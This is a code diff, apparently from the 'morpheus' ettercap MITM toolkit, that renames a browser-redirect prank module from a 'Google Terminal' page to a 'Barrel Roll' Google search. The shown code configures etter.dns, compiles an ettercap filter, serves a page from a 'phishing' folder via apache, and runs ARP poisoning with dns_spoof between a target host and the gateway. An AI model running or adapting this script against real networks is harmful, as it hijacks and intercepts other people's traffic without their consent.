@@ -2302,8 +2302,8 @@ sh_stage19 () {
 echo ""
 echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
 echo "${BlueF}    | ${YellowF}      This module will redirect target browsing surfing under     ${BlueF}|"
-echo "${BlueF}    | ${YellowF}       mitm attacks to google terminal website (google prank)     ${BlueF}|"
-echo "${BlueF}    | ${YellowF}      'All [.com] domains will be redirected to mrdoob.com'       ${BlueF}|"
+echo "${BlueF}    | ${YellowF}     mitm attacks to google barrel roll website (google prank)    ${BlueF}|"
+echo "${BlueF}    | ${YellowF}          'All [.com] domains will be redirected'                 ${BlueF}|"
 echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
 echo ""
 sleep 2
@@ -2321,25 +2321,24 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
   cd $IPATH/bin
   cp $IPATH/bin/etter.dns etter.rb > /dev/null 2>&1 # backup
   cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
-  cp $IPATH/filters/Gterminal.eft $IPATH/filters/Gterminal.rb > /dev/null 2>&1 # backup
+  cp $IPATH/filters/BarrelRoll.eft $IPATH/filters/BarrelRoll.rb > /dev/null 2>&1 # backup
   # use SED bash command to config our etter.dns
   sed -i "s|TaRgEt|$IP|g" etter.dns # NO dev/null to report file not existence :D
   sed -i "s|PrE|$PrEfI|g" etter.dns > /dev/null 2>&1
   cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
   echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
   # using SED bash command to config redirect.eft
-  sed -i "s|IpAdR|http://$IP/Gterminal.html|g" $IPATH/filters/Gterminal.eft > /dev/null 2>&1
+  sed -i "s|IpAdR|https://www.google.im/search?q=Do+a+Barrel+roll&gws_rd=ssl|g" $IPATH/filters/BarrelRoll.eft > /dev/null 2>&1
   # copy files needed to apache2 webroot...
-  cp -R $IPATH/bin/phishing/"Google Terminal_files" $ApachE > /dev/null 2>&1
-  cp $IPATH/bin/phishing/Gterminal.html $ApachE/index.html > /dev/null 2>&1
+  cp $IPATH/bin/phishing/BarrelRoll.html $ApachE/index.html > /dev/null 2>&1
   cd $IPATH
   sleep 1
 
 # compiling packet_drop.eft to be used in ettercap
-xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/Gterminal.eft"
-echo ${BlueF}[☠]${white} Compiling Gterminal.eft${RedF}!${Reset};
+xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/BarrelRoll.eft"
+echo ${BlueF}[☠]${white} Compiling BarrelRoll.eft${RedF}!${Reset};
 sleep 1
-xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/Gterminal.eft -o $IPATH/output/Gterminal.ef && sleep 3"
+xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/BarrelRoll.eft -o $IPATH/output/BarrelRoll.ef && sleep 3"
 echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
 /etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
 
@@ -2354,7 +2353,7 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
         ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
         else
         echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/terminal_prank -M ARP /$rhost// /$gateway//
+        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/BarrelRoll_prank -M ARP /$rhost// /$gateway//
         fi
 
       else
@@ -2364,18 +2363,17 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
         ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
         else
         echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/terminal_prank -M ARP /$rhost/ /$gateway/
+        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/BarrelRoll_prank -M ARP /$rhost/ /$gateway/
         fi
       fi
 
   # clean up
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
-/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
-  rm $IPATH/output/Gterminal.ef > /dev/null 2>&1
+/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stoping apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
+  rm $IPATH/output/BarrelRoll.ef > /dev/null 2>&1
   mv /tmp/etter.dns $Edns > /dev/null 2>&1
   mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
-  mv $IPATH/filters/Gterminal.rb $IPATH/filters/Gterminal.eft > /dev/null 2>&1 # backup
-  rm -R $ApachE/"Google Terminal_files" > /dev/null 2>&1
+  mv $IPATH/filters/BarrelRoll.rb $IPATH/filters/BarrelRoll.eft > /dev/null 2>&1 # backup
   rm $ApachE/index.html > /dev/null 2>&1
   cd $IPATH
   # port-forward
@@ -2570,7 +2568,7 @@ cat << !
     |  16    -  Replace website text            -  replace: worlds      |
     |  17    -  devices DHCP discovery          -  devices modem auth   |
     |  18    -  block cpu crypto-minning        -  drop/kill packets    |
-    |  19    -  Redirect browser traffic        -  to google term prank |
+    |  19    -  Redirect browser traffic        -  to google prank      |
     |                                                                   |
     |   W    -  Write your own filter                                   |
     |   S    -  Scan LAN for live hosts                                 |
